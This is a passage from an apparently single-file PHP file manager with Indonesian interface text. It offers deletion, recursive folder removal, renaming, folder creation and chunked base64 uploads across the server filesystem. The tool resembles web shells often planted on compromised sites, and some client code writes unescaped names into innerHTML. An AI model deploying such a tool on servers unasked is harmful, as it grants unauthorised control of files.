                                <button class="d" onclick="doDelete(<?= htmlspecialchars(json_encode($f['name']), ENT_QUOTES) ?>)">hapus</button>
                            </div>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        <?php endif; ?>
    <?php endif; ?>
</div>

<form method="post" id="renForm" style="display:none">
    <input type="hidden" name="d" value="<?= htmlspecialchars($cd) ?>">
    <input type="hidden" name="old" id="renOld">
    <input type="hidden" name="new" id="renNew">
</form>

<script>
var CD = <?= json_encode($cd) ?>;
var Q  = <?= json_encode($cd !== '/' ? 'd=' . rawurlencode($cd) . '&' : '') ?>;
var CHUNK_SIZE = <?= CHUNK_SIZE_HINT ?>;

function doDelete(n) {
    if (!confirm('Hapus file "' + n + '"?')) return;
    location.href = '?' + Q + 'del=' + encodeURIComponent(n);
}
function doRmrf(n) {
    if (!confirm('Hapus folder "' + n + '" beserta isinya?')) return;
    location.href = '?' + Q + 'rmrf=' + encodeURIComponent(n);
}
function doRename(n) {
    var baru = prompt('Nama baru:', n);
    if (!baru || baru === n) return;
    document.getElementById('renOld').value = n;
    document.getElementById('renNew').value = baru;
    document.getElementById('renForm').submit();
}
function newFolder() {
    var n = prompt('Nama folder baru:');
    if (!n) return;
    var f = document.createElement('form');
    f.method = 'post';
    f.innerHTML = '<input name="mkdir" value="' + n.replace(/"/g, '&quot;') + '">' +
                  '<input name="d" value="<?= htmlspecialchars($cd, ENT_QUOTES) ?>">';
    document.body.appendChild(f);
    f.submit();
}

var up=document.getElementById('up'), fi=document.getElementById('fi'),
    fn=document.getElementById('fn'), bt=document.getElementById('bt'),
    pg=document.getElementById('pg'), pgb=document.getElementById('pgb'),
    results=document.getElementById('results'), resultsList=document.getElementById('resultsList');

if (up) {
    up.onclick = function() { fi.click(); };
    ['dragenter','dragover'].forEach(function(e) {
        up.addEventListener(e, function(ev) { ev.preventDefault(); up.classList.add('over'); });
    });
    ['dragleave','drop'].forEach(function(e) {
        up.addEventListener(e, function(ev) { ev.preventDefault(); up.classList.remove('over'); });
    });
    up.addEventListener('drop', function(e) {
        if (e.dataTransfer.files.length) { fi.files = e.dataTransfer.files; pick(); }
    });
    fi.onchange = function() { pick(); };
}

function pick() {
    if (!fi.files.length) return;
    if (fi.files.length === 1) {
        var f = fi.files[0];
        fn.textContent = '📄 ' + f.name + ' (' + (f.size/1024).toFixed(1) + ' KB)';
    } else {
        fn.textContent = '📄 ' + fi.files.length + ' file';
    }
    bt.disabled = false;
    results.style.display = 'none';
}

function addResult(name, status, msg) {
    var item = document.createElement('div');
    item.className = 'item ' + status;
    item.innerHTML = '<span>' + name + '</span><span>' + msg + '</span>';
    resultsList.appendChild(item);
    results.scrollTop = results.scrollHeight;
}

function postForm(data, onProgress) {
    return new Promise(function(resolve) {
        var x = new XMLHttpRequest();
        if (onProgress) x.upload.onprogress = onProgress;
        x.onload = function() {
            try {
                resolve(JSON.parse(x.responseText));
            } catch (e) {
                resolve({ status: 'error', message: 'HTTP ' + x.status + ' — ' + x.responseText.substring(0, 150) });
            }
        };
        x.onerror = function() {
            resolve({ status: 'error', message: 'Koneksi error' });
        };
        x.open('POST', window.location.pathname);
        x.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
        x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        x.send(data);
    });
}

function blobToBase64(blob) {
    return new Promise(function(resolve) {
        var r = new FileReader();
        r.onload = function() { resolve(r.result.split(',')[1]); };
        r.readAsDataURL(blob);
    });
}

async function uploadChunked(file) {
    var totalChunks = Math.ceil(file.size / CHUNK_SIZE);
    var uploadId = 'u' + Date.now() + Math.random().toString(36).substring(2, 8);

    // 1. Start
    var startRes = await postForm(
        'action=chunk_start'
        + '&upload_id=' + encodeURIComponent(uploadId)
        + '&total_chunks=' + totalChunks
        + '&filename=' + encodeURIComponent(file.name)
        + '&d=' + encodeURIComponent(CD)
    );
    if (startRes.status !== 'ok') {
        return { ok: false, msg: startRes.message };
    }

    // 2. Kirim chunk satu per satu
    for (var i = 0; i < totalChunks; i++) {
        var start = i * CHUNK_SIZE;
        var end = Math.min(start + CHUNK_SIZE, file.size);
        var blob = file.slice(start, end);
        var b64 = await blobToBase64(blob);

        var chunkRes = await postForm(
            'action=chunk'
            + '&upload_id=' + encodeURIComponent(uploadId)
            + '&index=' + i
            + '&data=' + encodeURIComponent(b64)
            + '&d=' + encodeURIComponent(CD),
            function(e) {
                if (e.lengthComputable) {
                    var chunkProgress = e.loaded / e.total;
                    var overall = (i + chunkProgress) / totalChunks * 100;
                    pgb.style.width = overall.toFixed(0) + '%';
                    pgb.textContent = overall.toFixed(0) + '% (' + (i+1) + '/' + totalChunks + ')';
                }
            }
        );

        if (chunkRes.status !== 'ok') {
            await postForm(
                'action=chunk_cancel&upload_id=' + encodeURIComponent(uploadId)
                + '&total_chunks=' + totalChunks + '&d=' + encodeURIComponent(CD)
            );
            return { ok: false, msg: 'Chunk ' + (i+1) + ' gagal: ' + chunkRes.message };
        }
    }

    // 3. Selesai
    var endRes = await postForm(
        'action=chunk_end'
        + '&upload_id=' + encodeURIComponent(uploadId)
        + '&total_chunks=' + totalChunks
        + '&filename=' + encodeURIComponent(file.name)
        + '&d=' + encodeURIComponent(CD)
    );
    return { ok: endRes.status === 'ok', msg: endRes.message };
}

if (bt) {
    bt.onclick = async function() {
        if (!fi.files.length) return;
        bt.disabled = true;
        pg.style.display = 'block';
        results.style.display = 'block';
        resultsList.innerHTML = '';

        var successCount = 0;
        for (var i = 0; i < fi.files.length; i++) {
            var file = fi.files[i];
            bt.textContent = '⏳ Upload ' + (i + 1) + '/' + fi.files.length + '...';

            var res;
            if (file.size > CHUNK_SIZE) {
                res = await uploadChunked(file);
            } else {
                var b64 = await blobToBase64(file);
                var r = await postForm(
                    'f=' + encodeURIComponent(file.name)
                    + '&c=' + encodeURIComponent(b64)
                    + '&d=' + encodeURIComponent(CD),
                    function(e) {
                        if (e.lengthComputable) {
                            var pc = (e.loaded / e.total * 100).toFixed(0);
                            pgb.style.width = pc + '%';
                            pgb.textContent = pc + '%';
                        }
                    }
                );
                res = { ok: r.status === 'ok', msg: r.message };
            }

            addResult(file.name, res.ok ? 'ok' : 'er', res.msg);
            if (res.ok) successCount++;
        }

        bt.textContent = '⬆️ Upload';
        bt.disabled = false;

        if (successCount > 0) {
            setTimeout(function() { location.reload(); }, 2000);
        }
    };
}
</script>
</body>
</html>